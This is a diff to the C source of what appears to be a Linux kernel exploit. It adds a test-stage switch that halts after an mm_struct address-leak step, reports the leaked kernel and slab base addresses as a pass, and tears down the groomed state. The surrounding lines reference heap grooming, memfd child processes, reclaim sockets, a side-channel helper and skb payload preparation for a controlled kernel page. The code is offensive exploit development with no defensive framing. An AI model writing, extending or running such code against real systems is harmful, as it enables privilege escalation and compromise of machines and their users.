@@ -879,6 +879,24 @@ void cleanup_page_prepare_state(void) {
   skb_buf = NULL;
 }
 
+static int rmg_test_stage_is(const char *stage) {
+  const char *selected = getenv("RMG_TEST_STAGE");
+  return selected && strcmp(selected, stage) == 0;
+}
+
+static void cleanup_mm_search_test(void) {
+  if (ks) {
+    kernelsnitch_cleanup(ks);
+    ks = NULL;
+  }
+  for (size_t i = 0; i < prepare_ctx.mm_cnt; ++i) {
+    kill_child(prepare_ctx.childs[i]);
+    prepare_ctx.childs[i] = -1;
+  }
+  cleanup_page_prepare_state();
+  close_reclaim_sockets();
+}
+
 int clone_memfd(void) {
   pid_t child = clone_child();
   int fd = open_memfd(child);
@@ -1939,6 +1957,19 @@ static uintptr_t prepare_controlled_kernel_page(int payload_mode) {
   }
   pr_info("controlled mm group selected base=%016zx mode=%d\n",
           base, payload_mode);
+  if (rmg_test_stage_is("mm_struct")) {
+    pr_success("rmg-test stage=mm_struct result=pass base=%016zx "
+               "object=group-search\n", base);
+    for (size_t i = 0; i < mm_objs_per_slab; ++i) {
+      if (target_fds[i] >= 0) {
+        close(target_fds[i]);
+      }
+    }
+    free(target_fds);
+    cleanup_page_prepare_state();
+    close_reclaim_sockets();
+    return base;
+  }
   if (!prepare_skb_payload(base, payload_mode)) {
     for (size_t i = 0; i < mm_objs_per_slab; ++i) {
       if (target_fds[i] >= 0) {
@@ -2261,6 +2292,14 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
           leaked, base, (leaked - base) / MM_STRUCT_SZ);
 #endif
+  if (rmg_test_stage_is("mm_struct")) {
+    size_t object_index = (leaked - base) / MM_STRUCT_SZ;
+    pr_success("rmg-test stage=mm_struct result=pass mm=%016zx "
+               "base=%016zx object_index=%zu\n",
+               leaked, base, object_index);
+    cleanup_mm_search_test();
+    return base;
+  }
   int slide_bank_configured = 1;
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
     defined(SLIDE_P0_OFFSET_CANDIDATES)
